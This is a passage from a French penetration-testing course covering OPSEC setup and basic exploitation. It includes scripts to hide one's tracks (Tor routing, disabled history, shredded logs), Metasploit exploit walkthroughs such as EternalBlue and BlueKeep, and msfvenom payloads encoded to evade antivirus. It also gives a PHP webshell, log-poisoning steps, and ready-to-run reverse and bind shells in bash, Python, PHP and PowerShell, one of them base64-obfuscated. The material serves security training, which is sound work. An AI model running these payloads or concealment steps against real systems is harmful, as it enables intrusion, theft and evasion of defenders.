    echo "[!] Installez Kali Linux sur la VM, puis exécutez: $0 snapshot"
    
    # Démarrage de la VM
    VBoxManage startvm "$TEMPLATE_NAME"
}

# Fonction pour créer un snapshot du template
snapshot_template() {
    echo "[+] Création d'un snapshot du template: $TEMPLATE_NAME"
    
    # Création du snapshot
    VBoxManage snapshot "$TEMPLATE_NAME" take "$SNAPSHOT_NAME" --description "État propre pour VM jetables"
    
    echo "[+] Snapshot créé: $SNAPSHOT_NAME"
}

# Fonction pour créer une VM jetable
create_disposable_vm() {
    local date_suffix=$(date +%Y%m%d_%H%M%S)
    local vm_name="${VM_PREFIX}-${date_suffix}"
    
    echo "[+] Création de la VM jetable: $vm_name"
    
    # Clonage de la VM template
    VBoxManage clonevm "$TEMPLATE_NAME" --name "$vm_name" --register
    
    # Configuration de la VM
    VBoxManage modifyvm "$vm_name" --memory $VM_MEMORY --cpus $VM_CPUS
    
    # Configuration réseau (NAT + réseau hôte uniquement)
    VBoxManage modifyvm "$vm_name" --nic1 nat
    VBoxManage modifyvm "$vm_name" --nic2 hostonly --hostonlyadapter2 vboxnet0
    
    echo "[+] VM jetable créée: $vm_name"
    echo "[+] Démarrage de la VM..."
    
    # Démarrage de la VM
    VBoxManage startvm "$vm_name"
    
    # Enregistrement du nom de la VM pour destruction ultérieure
    echo "$vm_name" > ~/.last_disposable_vm
}

# Fonction pour détruire la dernière VM jetable
destroy_disposable_vm() {
    if [ -f ~/.last_disposable_vm ]; then
        local vm_name=$(cat ~/.last_disposable_vm)
        
        echo "[+] Destruction de la VM jetable: $vm_name"
        
        # Arrêt forcé de la VM
        VBoxManage controlvm "$vm_name" poweroff
        
        # Attente de l'arrêt complet
        sleep 2
        
        # Suppression de la VM et de ses fichiers
        VBoxManage unregistervm "$vm_name" --delete
        
        echo "[+] VM jetable détruite: $vm_name"
        rm ~/.last_disposable_vm
    else
        echo "[-] Aucune VM jetable à détruire"
    fi
}

# Menu principal
case "$1" in
    template)
        create_template
        ;;
    snapshot)
        snapshot_template
        ;;
    create)
        create_disposable_vm
        ;;
    destroy)
        destroy_disposable_vm
        ;;
    *)
        echo "Usage: $0 {template|snapshot|create|destroy}"
        echo "  template : Crée une VM template"
        echo "  snapshot : Crée un snapshot du template"
        echo "  create   : Crée une nouvelle VM jetable"
        echo "  destroy  : Détruit la dernière VM jetable créée"
        exit 1
        ;;
esac

exit 0
EOF

# Rendre le script exécutable
chmod +x vm_jetable.sh
```

3. **Configuration de proxychains**

```bash
# Configuration de proxychains
sudo cp /etc/proxychains4.conf /etc/proxychains4.conf.bak

# Édition du fichier de configuration
sudo bash -c 'cat > /etc/proxychains4.conf << EOF
# proxychains.conf

# Chaînage dynamique - chaque connexion suit la chaîne de haut en bas
dynamic_chain

# Proxy DNS - force la résolution DNS via les proxies
proxy_dns

# Timeouts en millisecondes
tcp_read_time_out 15000
tcp_connect_time_out 8000

# Liste des proxies
# Format: type IP port [user pass]

# Tor comme premier proxy
socks5 127.0.0.1 9050

# SSH comme deuxième proxy (à configurer)
#socks5 127.0.0.1 1080
EOF'
```

4. **Création d'un script de préparation OPSEC**

```bash
# Création du script
cat > opsec_prep.sh << 'EOF'
#!/bin/bash
# Script de préparation OPSEC

echo "[+] Préparation de l'environnement OPSEC..."

# Désactivation de l'historique
unset HISTFILE
export HISTSIZE=0
export HISTFILESIZE=0

# Création d'un répertoire temporaire sécurisé
mkdir -p ~/.secure_tmp
mount -t tmpfs -o size=100M,mode=0700 tmpfs ~/.secure_tmp
export TMPDIR=~/.secure_tmp

# Vérification que Tor est en cours d'exécution
if ! pgrep -x "tor" > /dev/null; then
    echo "[!] Tor n'est pas en cours d'exécution. Démarrage..."
    sudo systemctl start tor
fi

# Vérification de l'adresse IP
echo "[+] Adresse IP sans proxy:"
curl -s ifconfig.me
echo "[+] Adresse IP avec proxy:"
proxychains4 curl -s ifconfig.me

echo "[+] Environnement OPSEC prêt"
EOF

# Rendre le script exécutable
chmod +x opsec_prep.sh
```

5. **Création d'un script de nettoyage OPSEC**

```bash
# Création du script
cat > opsec_cleanup.sh << 'EOF'
#!/bin/bash
# Script de nettoyage OPSEC

echo "[+] Nettoyage de l'environnement OPSEC..."

# Nettoyage des fichiers temporaires
if mountpoint -q ~/.secure_tmp; then
    rm -rf ~/.secure_tmp/*
    umount ~/.secure_tmp
    rmdir ~/.secure_tmp
fi

# Nettoyage des logs
if [ -f ~/.bash_history ]; then
    cat /dev/null > ~/.bash_history
fi

# Nettoyage des caches de navigateur
if [ -d ~/.mozilla ]; then
    echo "[!] Pensez à nettoyer les caches de Firefox"
fi

# Nettoyage des fichiers de travail
find ~/pentest_labs -type f -name "*.txt" -o -name "*.log" | while read file; do
    echo "[+] Suppression de $file"
    shred -u "$file"
done

echo "[+] Nettoyage OPSEC terminé"
EOF

# Rendre le script exécutable
chmod +x opsec_cleanup.sh
```

6. **Création d'un script de test OPSEC**

```bash
# Création du script
cat > opsec_test.sh << 'EOF'
#!/bin/bash
# Script de test OPSEC

echo "[+] Test de l'environnement OPSEC..."

# Test de l'historique
echo "[+] Test de l'historique bash"
history | wc -l

# Test de proxychains
echo "[+] Test de proxychains"
proxychains4 curl -s ifconfig.me

# Test de fuite DNS
echo "[+] Test de fuite DNS"
proxychains4 nslookup example.com | grep -i "server"

# Test de VM jetable
echo "[+] Vérification des VM en cours d'exécution"
VBoxManage list runningvms

echo "[+] Test OPSEC terminé"
EOF

# Rendre le script exécutable
chmod +x opsec_test.sh
```

7. **Mise en place de l'environnement complet**

```bash
# Création du réseau hôte uniquement pour VirtualBox
VBoxManage hostonlyif create
VBoxManage hostonlyif ipconfig vboxnet0 --ip 192.168.56.1 --netmask 255.255.255.0

# Création du template Kali
./vm_jetable.sh template

# Une fois l'installation terminée, créez un snapshot
./vm_jetable.sh snapshot

# Création d'une VM jetable
./vm_jetable.sh create

# Préparation de l'environnement OPSEC
./opsec_prep.sh

# Test de l'environnement OPSEC
./opsec_test.sh
```

8. **Utilisation de l'environnement pour un test simple**

```bash
# Dans la VM jetable, exécutez:
# Désactivation de l'historique
unset HISTFILE
export HISTSIZE=0

# Installation de proxychains
sudo apt update
sudo apt install -y proxychains4 tor

# Démarrage de Tor
sudo systemctl start tor

# Test avec proxychains
proxychains4 curl ifconfig.me

# Scan discret avec Nmap
proxychains4 nmap -sT -T2 -p 80,443 example.com
```

9. **Nettoyage après utilisation**

```bash
# Exécution du script de nettoyage
./opsec_cleanup.sh

# Destruction de la VM jetable
./vm_jetable.sh destroy
```

#### Vue Blue Team

Dans un environnement réel, cette approche OPSEC de niveau 1 réduirait significativement les traces détectables :

1. **Réduction des traces d'identité**
   - Utilisation d'une VM jetable sans lien avec votre identité réelle
   - Routage du trafic via Tor pour masquer l'adresse IP source
   - Absence d'historique de commandes et de fichiers temporaires persistants

2. **Réduction des traces réseau**
   - Masquage de l'adresse IP source via proxychains
   - Utilisation de techniques de scan discrètes (timing lent, scan ciblé)
   - Prévention des fuites DNS via proxy_dns

3. **Contre-mesures possibles**
   - Détection des nœuds de sortie Tor (souvent surveillés)
   - Analyse comportementale sur une période prolongée
   - Corrélation d'événements de différentes sources

#### Résultat attendu

À la fin de cet exercice, vous devriez :
- Avoir mis en place un environnement de pentesting cloisonné avec VM jetable
- Comprendre comment réduire vos traces lors d'opérations offensives
- Être capable de tester l'efficacité de vos mesures OPSEC
- Apprécier l'importance du cloisonnement et de la gestion des identités
- Avoir acquis les bases de l'OPSEC de niveau 1, fondamentales pour toute activité de sécurité offensive
# PARTIE I : FONDATIONS eJPT (+ OPSEC NIVEAU 1)

## Chapitre 8 : Exploitation basique

### Introduction : Pourquoi ce thème est important

L'exploitation est au cœur du pentesting et représente la phase où les vulnérabilités identifiées sont effectivement exploitées pour obtenir un accès au système cible. Comprendre les principes fondamentaux de l'exploitation, savoir utiliser des frameworks comme Metasploit et maîtriser les techniques de base pour obtenir un shell sont des compétences essentielles pour tout pentester. Ce chapitre vous fournira les connaissances nécessaires pour exploiter les vulnérabilités courantes de manière contrôlée et documentée, tout en intégrant les considérations OPSEC pour minimiser la détection de vos activités par les équipes défensives.

### Principes de l'exploitation

L'exploitation est un processus méthodique qui nécessite une compréhension approfondie des vulnérabilités et de leur fonctionnement.

#### Cycle de vie d'une exploitation

1. **Identification de la vulnérabilité**
   - Découverte via scanning, énumération, recherche de CVE
   - Vérification des conditions préalables (version, configuration)
   - Évaluation de l'exploitabilité dans le contexte spécifique

2. **Développement/sélection de l'exploit**
   - Recherche d'exploits existants (Exploit-DB, GitHub, Metasploit)
   - Adaptation de l'exploit au contexte spécifique
   - Développement d'un exploit personnalisé si nécessaire

3. **Préparation de l'environnement**
   - Configuration des outils nécessaires
   - Préparation des payloads et listeners
   - Mise en place de tunnels ou proxies si nécessaire

4. **Exécution de l'exploit**
   - Lancement contrôlé de l'exploit
   - Surveillance des résultats et des erreurs
   - Ajustement des paramètres si nécessaire

5. **Post-exploitation**
   - Maintien de l'accès
   - Élévation de privilèges
   - Mouvement latéral
   - Nettoyage des traces

#### Types d'exploits courants

1. **Exploits de débordement de mémoire (Buffer Overflow)**
   - Dépassement de tampon sur la pile (Stack Overflow)
   - Dépassement de tampon sur le tas (Heap Overflow)
   - Écrasement de pointeurs de fonction
   
   ```c
   // Exemple simplifié de code vulnérable au buffer overflow
   void fonction_vulnerable(char *input) {
       char buffer[64];
       strcpy(buffer, input);  // Pas de vérification de la taille
   }
   ```

2. **Exploits d'injection**
   - Injection SQL
   - Injection de commandes
   - Cross-Site Scripting (XSS)
   
   ```bash
   # Exemple d'injection de commande
   ping 192.168.1.1; cat /etc/passwd
   
   # Exemple d'injection SQL
   ' OR 1=1--
   ```

3. **Exploits de configuration**
   - Services mal configurés
   - Permissions incorrectes
   - Identifiants par défaut
   
   ```bash
   # Exemple de test d'identifiants par défaut
   hydra -l admin -p admin ssh://192.168.1.10
   ```

4. **Exploits de logique applicative**
   - Contournement d'authentification
   - Manipulation de paramètres
   - Race conditions
   
   ```bash
   # Exemple de manipulation de paramètre
   curl "http://example.com/profile.php?id=1&admin=true"
   ```

#### Considérations éthiques et légales

1. **Limites des tests autorisés**
   - Respecter le périmètre défini dans les règles d'engagement
   - Éviter les exploits destructifs ou perturbateurs
   - Documenter toutes les actions effectuées

2. **Gestion des risques**
   - Évaluer l'impact potentiel avant l'exploitation
   - Avoir un plan de restauration en cas de problème
   - Privilégier les exploits stables et testés

3. **Responsabilité du pentester**
   - Informer immédiatement en cas de découverte critique
   - Ne pas exfiltrer de données sensibles sans autorisation
   - Maintenir la confidentialité des vulnérabilités découvertes

### Metasploit Framework : architecture et utilisation

Metasploit Framework est l'outil d'exploitation le plus populaire et le plus complet dans le domaine de la sécurité offensive.

#### Architecture de Metasploit

1. **Composants principaux**
   - **Modules** : Exploits, payloads, auxiliaires, post-exploitation
   - **Bibliothèques** : Code réutilisable pour le développement de modules
   - **Interfaces** : Console (msfconsole), CLI (msfcli), GUI (Armitage)
   - **Outils** : msfvenom, msfdb, pattern_create, pattern_offset

2. **Types de modules**
   - **Exploits** : Code qui tire parti d'une vulnérabilité
   - **Payloads** : Code exécuté après exploitation réussie
   - **Auxiliaires** : Scanners, fuzzers, sniffers
   - **Post** : Modules de post-exploitation
   - **Encoders** : Outils pour obfusquer les payloads
   - **NOPs** : Générateurs de NOP sleds pour les exploits de mémoire
   - **Evasion** : Techniques pour contourner les défenses

3. **Types de payloads**
   - **Singles** : Payloads autonomes et compacts
   - **Stagers** : Petits payloads qui établissent une connexion
   - **Stages** : Payloads plus complexes chargés par les stagers
   - **Meterpreter** : Payload avancé avec de nombreuses fonctionnalités

#### Installation et configuration

1. **Installation sur Kali Linux**
   ```bash
   # Metasploit est préinstallé sur Kali Linux
   # Mise à jour de Metasploit
   sudo apt update
   sudo apt install -y metasploit-framework
   
   # Initialisation de la base de données
   sudo msfdb init
   ```

2. **Configuration de base**
   ```bash
   # Lancement de msfconsole
   msfconsole
   
   # Vérification de la connexion à la base de données
   msf6 > db_status
   
   # Configuration du workspace
   msf6 > workspace -a mon_projet
   msf6 > workspace mon_projet
   ```

3. **Importation de données de scan**
   ```bash
   # Exécution d'un scan Nmap et importation
   sudo nmap -sV -oX scan.xml 192.168.1.0/24
   msf6 > db_import scan.xml
   
   # Vérification des hôtes importés
   msf6 > hosts
   
   # Vérification des services importés
   msf6 > services
   ```

#### Utilisation de base

1. **Recherche d'exploits**
   ```bash
   # Recherche par nom
   msf6 > search apache
   
   # Recherche par CVE
   msf6 > search cve:2021-44228
   
   # Recherche par type
   msf6 > search type:exploit platform:windows
   ```

2. **Utilisation d'un exploit**
   ```bash
   # Sélection d'un exploit
   msf6 > use exploit/windows/smb/ms17_010_eternalblue
   
   # Affichage des options requises
   msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
   
   # Configuration des options
   msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.10
   msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.100
   
   # Vérification de la compatibilité
   msf6 exploit(windows/smb/ms17_010_eternalblue) > check
   
   # Exécution de l'exploit
   msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
   ```

3. **Gestion des sessions**
   ```bash
   # Affichage des sessions actives
   msf6 > sessions -l
   
   # Interaction avec une session
   msf6 > sessions -i 1
   
   # Exécution de commandes dans une session
   msf6 > sessions -c "whoami" -i 1
   
   # Mise en arrière-plan d'une session
   meterpreter > background
   ```

4. **Utilisation de Meterpreter**
   ```bash
   # Commandes de base
   meterpreter > sysinfo
   meterpreter > getuid
   meterpreter > ps
   
   # Navigation dans le système de fichiers
   meterpreter > pwd
   meterpreter > ls
   meterpreter > cd C:\\Users
   
   # Transfert de fichiers
   meterpreter > upload /path/to/local/file.txt C:\\remote\\path\\
   meterpreter > download C:\\remote\\file.txt /local/path/
   
   # Élévation de privilèges
   meterpreter > getsystem
   
   # Capture d'écran
   meterpreter > screenshot
   
   # Keylogging
   meterpreter > keyscan_start
   meterpreter > keyscan_dump
   meterpreter > keyscan_stop
   ```

#### Génération de payloads avec msfvenom

msfvenom est un outil puissant pour générer des payloads personnalisés.

1. **Syntaxe de base**
   ```bash
   msfvenom -p <payload> <options> -f <format> -o <output_file>
   ```

2. **Exemples courants**
   ```bash
   # Génération d'un exécutable Windows
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe
   
   # Génération d'un shellcode en format C
   msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f c -o shellcode.c
   
   # Génération d'un script PowerShell
   msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.100 LPORT=443 -f psh -o payload.ps1
   
   # Génération d'un WAR pour déploiement sur Tomcat
   msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f war -o payload.war
   ```

3. **Encodage et évasion**
   ```bash
   # Encodage pour éviter les caractères nuls
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -f exe -o encoded_payload.exe
   
   # Encodage multiple
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o multi_encoded_payload.exe
   
   # Utilisation de techniques d'évasion
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 --platform windows --arch x86 -e x86/shikata_ga_nai -i 10 -f exe -o evasive_payload.exe
   ```

4. **Configuration d'un handler pour recevoir les connexions**
   ```bash
   # Dans msfconsole
   msf6 > use exploit/multi/handler
   msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
   msf6 exploit(multi/handler) > set LHOST 192.168.1.100
   msf6 exploit(multi/handler) > set LPORT 4444
   msf6 exploit(multi/handler) > exploit -j
   ```

### Exploitation de vulnérabilités courantes

#### Exploitation de services vulnérables

1. **Exploitation de serveurs web**
   - **Apache Tomcat Manager**
   ```bash
   # Utilisation de l'exploit Tomcat Manager
   msf6 > use exploit/multi/http/tomcat_mgr_deploy
   msf6 exploit(multi/http/tomcat_mgr_deploy) > set RHOSTS 192.168.1.10
   msf6 exploit(multi/http/tomcat_mgr_deploy) > set RPORT 8080
   msf6 exploit(multi/http/tomcat_mgr_deploy) > set USERNAME tomcat
   msf6 exploit(multi/http/tomcat_mgr_deploy) > set PASSWORD tomcat
   msf6 exploit(multi/http/tomcat_mgr_deploy) > set LHOST 192.168.1.100
   msf6 exploit(multi/http/tomcat_mgr_deploy) > exploit
   ```
   
   - **Jenkins Script Console**
   ```bash
   # Utilisation de l'exploit Jenkins Script Console
   msf6 > use exploit/multi/http/jenkins_script_console
   msf6 exploit(multi/http/jenkins_script_console) > set RHOSTS 192.168.1.10
   msf6 exploit(multi/http/jenkins_script_console) > set RPORT 8080
   msf6 exploit(multi/http/jenkins_script_console) > set USERNAME admin
   msf6 exploit(multi/http/jenkins_script_console) > set PASSWORD admin
   msf6 exploit(multi/http/jenkins_script_console) > set LHOST 192.168.1.100
   msf6 exploit(multi/http/jenkins_script_console) > exploit
   ```

2. **Exploitation de services Windows**
   - **SMB (EternalBlue)**
   ```bash
   # Utilisation de l'exploit EternalBlue
   msf6 > use exploit/windows/smb/ms17_010_eternalblue
   msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.10
   msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.100
   msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
   ```
   
   - **RDP (BlueKeep)**
   ```bash
   # Utilisation de l'exploit BlueKeep
   msf6 > use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
   msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set RHOSTS 192.168.1.10
   msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set LHOST 192.168.1.100
   msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set TARGET 2  # Windows 7 SP1
   msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > exploit
   ```

3. **Exploitation de services Linux**
   - **SSH (libssh Authentication Bypass)**
   ```bash
   # Utilisation de l'exploit libssh
   msf6 > use auxiliary/scanner/ssh/libssh_auth_bypass
   msf6 auxiliary(scanner/ssh/libssh_auth_bypass) > set RHOSTS 192.168.1.10
   msf6 auxiliary(scanner/ssh/libssh_auth_bypass) > set RPORT 22
   msf6 auxiliary(scanner/ssh/libssh_auth_bypass) > set SPAWN_PTY true
   msf6 auxiliary(scanner/ssh/libssh_auth_bypass) > run
   ```
   
   - **Samba (is_known_pipename)**
   ```bash
   # Utilisation de l'exploit Samba
   msf6 > use exploit/linux/samba/is_known_pipename
   msf6 exploit(linux/samba/is_known_pipename) > set RHOSTS 192.168.1.10
   msf6 exploit(linux/samba/is_known_pipename) > set LHOST 192.168.1.100
   msf6 exploit(linux/samba/is_known_pipename) > exploit
   ```

#### Exploitation d'applications web

1. **Exploitation de CMS**
   - **WordPress**
   ```bash
   # Scan de WordPress
   msf6 > use auxiliary/scanner/http/wordpress_scanner
   msf6 auxiliary(scanner/http/wordpress_scanner) > set RHOSTS 192.168.1.10
   msf6 auxiliary(scanner/http/wordpress_scanner) > run
   
   # Exploitation d'un plugin vulnérable
   msf6 > use exploit/unix/webapp/wp_plugin_file_manager_rce
   msf6 exploit(unix/webapp/wp_plugin_file_manager_rce) > set RHOSTS 192.168.1.10
   msf6 exploit(unix/webapp/wp_plugin_file_manager_rce) > set LHOST 192.168.1.100
   msf6 exploit(unix/webapp/wp_plugin_file_manager_rce) > exploit
   ```
   
   - **Joomla**
   ```bash
   # Scan de Joomla
   msf6 > use auxiliary/scanner/http/joomla_version
   msf6 auxiliary(scanner/http/joomla_version) > set RHOSTS 192.168.1.10
   msf6 auxiliary(scanner/http/joomla_version) > run
   
   # Exploitation d'une vulnérabilité
   msf6 > use exploit/unix/webapp/joomla_media_upload_exec
   msf6 exploit(unix/webapp/joomla_media_upload_exec) > set RHOSTS 192.168.1.10
   msf6 exploit(unix/webapp/joomla_media_upload_exec) > set LHOST 192.168.1.100
   msf6 exploit(unix/webapp/joomla_media_upload_exec) > exploit
   ```

2. **Exploitation de vulnérabilités web courantes**
   - **SQL Injection**
   ```bash
   # Utilisation de sqlmap
   sqlmap -u "http://192.168.1.10/page.php?id=1" --dbs
   sqlmap -u "http://192.168.1.10/page.php?id=1" -D database_name --tables
   sqlmap -u "http://192.168.1.10/page.php?id=1" -D database_name -T users --dump
   
   # Exploitation manuelle
   curl "http://192.168.1.10/page.php?id=1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40 --"
   ```
   
   - **File Upload**
   ```bash
   # Création d'un webshell PHP
   echo '<?php system($_GET["cmd"]); ?>' > shell.php
   
   # Upload via un formulaire vulnérable
   # Puis accès au shell
   curl "http://192.168.1.10/uploads/shell.php?cmd=id"
   ```
   
   - **Local File Inclusion (LFI)**
   ```bash
   # Test de LFI
   curl "http://192.168.1.10/page.php?file=../../../etc/passwd"
   
   # Exploitation avec log poisoning
   nc 192.168.1.10 80
   GET /<?php system($_GET['cmd']); ?> HTTP/1.1
   Host: 192.168.1.10
   
   # Accès au shell via les logs
   curl "http://192.168.1.10/page.php?file=../../../var/log/apache2/access.log&cmd=id"
   ```

3. **Exploitation de vulnérabilités d'authentification**
   - **Brute Force**
   ```bash
   # Utilisation de Hydra pour brute force HTTP
   hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.10 http-post-form "/login.php:username=^USER^&password=^PASS^:Login failed"
   
   # Utilisation de Metasploit
   msf6 > use auxiliary/scanner/http/http_login
   msf6 auxiliary(scanner/http/http_login) > set RHOSTS 192.168.1.10
   msf6 auxiliary(scanner/http/http_login) > set USERPASS_FILE /usr/share/wordlists/metasploit/http_default_userpass.txt
   msf6 auxiliary(scanner/http/http_login) > set STOP_ON_SUCCESS true
   msf6 auxiliary(scanner/http/http_login) > run
   ```
   
   - **Contournement d'authentification**
   ```bash
   # Test de contournement simple
   curl "http://192.168.1.10/admin.php?admin=1"
   
   # Test de manipulation de cookie
   curl -b "auth=YWRtaW46YWRtaW4=" "http://192.168.1.10/admin.php"
   ```

### Techniques de base pour obtenir un shell

#### Reverse shells

Les reverse shells initient une connexion depuis la cible vers l'attaquant, ce qui est utile pour contourner les pare-feu.

1. **Configuration du listener**
   ```bash
   # Listener Netcat
   nc -lvnp 4444
   
   # Listener Metasploit
   msf6 > use exploit/multi/handler
   msf6 exploit(multi/handler) > set PAYLOAD linux/x86/shell_reverse_tcp
   msf6 exploit(multi/handler) > set LHOST 192.168.1.100
   msf6 exploit(multi/handler) > set LPORT 4444
   msf6 exploit(multi/handler) > exploit
   ```

2. **Reverse shells en Bash**
   ```bash
   # Reverse shell Bash
   bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
   
   # Alternative avec /dev/tcp
   0<&196;exec 196<>/dev/tcp/192.168.1.100/4444; sh <&196 >&196 2>&196
   ```

3. **Reverse shells en Python**
   ```python
   # Python 2
   python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.100",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
   
   # Python 3
   python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.100",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
   ```

4. **Reverse shells en PHP**
   ```php
   # PHP
   php -r '$sock=fsockopen("192.168.1.100",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
   
   # PHP alternative
   <?php system("bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'"); ?>
   ```

5. **Reverse shells en PowerShell**
   ```powershell
   # PowerShell
   powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("192.168.1.100",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
   
   # PowerShell encodé
   powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAiACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
   ```

#### Bind shells

Les bind shells ouvrent un port sur la cible et attendent une connexion entrante.

1. **Configuration du bind shell**
   ```bash
   # Bind shell Netcat
   nc -lvnp 4444 -e /bin/bash
   
   # Bind shell Python
   python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",4444));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call(["/bin/sh","-i"])'
   ```

2. **Connexion au bind shell**
   ```bash
   # Connexion avec Netcat
   nc 192.168.1.10 4444
   
   # Connexion avec Telnet
   telnet 192.168.1.10 4444
   ```

#### Amélioration des shells

Les shells bruts ont souvent des fonctionnalités limitées. Voici comment les améliorer :

1. **Transformation en TTY interactif**
   ```bash
   # Méthode Python
   python -c 'import pty; pty.spawn("/bin/bash")'
   
   # Méthode Python3
   python3 -c 'import pty; pty.spawn("/bin/bash")'
   
   # Méthode script
   script -qc /bin/bash /dev/null
   ```

2. **Configuration du terminal**
   ```bash
   # Après avoir obtenu un shell TTY
   # Appuyez sur Ctrl+Z pour mettre le shell en arrière-plan
   stty raw -echo
   fg
   # Appuyez sur Entrée
   
   # Configuration du terminal
   export TERM=xterm-256color
   stty rows 40 columns 160
   ```

3. **Transfert de fichiers via le shell**
   ```bash
   # Transfert avec Netcat (depuis l'attaquant)
   nc -lvnp 1234 < file.txt
   
   # Réception avec Netcat (sur la cible)
   nc 192.168.1.100 1234 > file.txt
   
   # Transfert avec base64
   # Sur l'attaquant
   base64 -w 0 file.txt
   # Copier la sortie
   
   # Sur la cible
   echo "BASE64_OUTPUT" | base64 -d > file.txt
   ```

### Vue Blue Team / logs générés / alertes SIEM

#### Traces générées par Metasploit

1. **Logs réseau**
   - Connexions TCP/UDP inhabituelles
   - Trafic chiffré ou encodé suspect
   - Patterns de communication caractéristiques
   
   **Exemple de log Wireshark :**
   ```
   192.168.1.100 -> 192.168.1.10 [TCP] 4444 -> 49152 [SYN]
   192.168.1.10 -> 192.168.1.100 [TCP] 49152 -> 4444 [SYN, ACK]
   192.168.1.100 -> 192.168.1.10 [TCP] 4444 -> 49152 [ACK]
   ```

2. **Logs système**
   - Processus enfants inhabituels
   - Exécution de binaires système dans des contextes anormaux
   - Modifications de registre ou de fichiers système
   
   **Exemple de log Windows (Event ID 4688) :**
   ```
   A new process has been created.
   Creator Process ID: 0x123
   New Process ID: 0x456
   New Process Name: C:\Windows\System32\cmd.exe
